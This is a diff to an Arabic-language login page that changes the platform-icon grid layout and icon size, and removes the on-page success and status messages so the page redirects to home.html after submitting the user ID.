@@ -118,15 +118,15 @@
     }
     .platform-icons {
       display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(110px, 1fr));
+      grid-template-columns: repeat(3, 1fr); /* ← تم التعديل هنا */
       gap: 20px;
       justify-items: center;
       margin: 20px 0;
     }
     .icon {
       position: relative;
-      width: 110px;
-      height: 110px;
+      width: 100px;
+      height: 100px;
       border-radius: 14px;
       background: #fff;
       box-shadow: 0 2px 8px rgba(0, 0, 0, .05);
@@ -209,12 +209,6 @@
         transform: rotate(360deg);
       }
     }
-    .msg-success {
-      color: green;
-    }
-    .msg-error {
-      color: red;
-    }
   </style>
 </head>
 <body>
@@ -250,8 +244,6 @@
     <button class="login-btn" id="login-btn" disabled>
       تسجيل الدخول
     </button>
-
-    <div class="error-message" id="status-message"></div>
   </section>
 </main>
 
@@ -260,7 +252,6 @@
   const errMsg = document.getElementById('error-message');
   const btn = document.getElementById('login-btn');
   const icons = document.querySelectorAll('.icon');
-  const status = document.getElementById('status-message');
   let platform = null;
 
   const repReg = /^(\d)\1{9}$/;
@@ -308,8 +299,6 @@
   btn.addEventListener('click', async () => {
     btn.innerHTML = '<span class="btn-spinner"></span> جارٍ الإرسال...';
     btn.disabled = true;
-    status.textContent = '';
-    status.className = 'error-message';
 
     const payload = {
       userId: input.value,
@@ -324,15 +313,12 @@
         body: JSON.stringify(payload)
       });
 
-      status.textContent = 'تم الإرسال بنجاح! سيتم تحويلك...';
-      status.classList.add('msg-success');
-
+      // لا نعرض أي رسالة، فقط تحويل
       setTimeout(() => {
         window.location.href = 'home.html';
       }, 1200);
     } catch (err) {
-      status.textContent = 'حدث خطأ أثناء الإرسال، حاول مجددًا.';
-      status.classList.add('msg-error');
+      errMsg.textContent = 'حدث خطأ أثناء الإرسال، حاول مجددًا.';
       btn.innerHTML = 'تسجيل الدخول';
       btn.disabled = false;
     }
